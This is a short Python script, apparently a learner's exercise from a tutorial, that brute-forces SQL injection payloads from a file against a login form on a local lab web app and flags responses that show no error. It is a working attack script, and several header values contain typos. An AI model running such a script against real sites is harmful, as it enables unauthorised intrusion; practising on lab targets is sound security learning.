# Written using this tutorial: https://www.youtube.com/watch?v=IO-B0-9jOoo. Comments added by me for understanding
# Disclaimer: performing SQL Injections wihtout consent is illegal
import requests

# Information on the page to be attacked, namely its URL and headers
target = "http://10.10.30.130/sqli_3.php"  # Targets a locally hosted PHP site
headers = {
            "Host": "10.10.30.130",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, */*,; q=0.8",
            "Accept-Language": "en-US,en;9=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "applicaiton/x-www-form-urlencoded",
            "Content-Length": "38",
            "Origin": "hhtp://10.10.30.130",
            "Connection": "keep-alive",
            "Referer": "http://10.10.30.130/sqli_3.php",
            "Cookie": "sexurity_level=0; PHPSESSID=44aqofkmkgd4hta10956jfg0t2",
            "Upgrade-Insecure-Requests": "1"
    }

# Define the payload to be delivered to the site
with open("payloads.txt", "r") as text:
    payloads = text.readlines()

# Tests mutliple logins
for item in payloads:
    payload = item.strip('\n')  # Removes newlines to prevent errors
    data = {
            "login":payload,
            "password": "pass",
            "form": "submit"
        }

    # Deploy the payload to the target
    p = requests.post(target, data=data, headers=headers)

    # If a credential doesn't throw an error, print it as a possible injection
    if "Invalid credentials" not in p.text and "Error: " not in p.text:
        print(f" Found possible injection: {payload}")
        
"""
    Things I've learned:
    1. How to automate an SQL injection with requests
"""
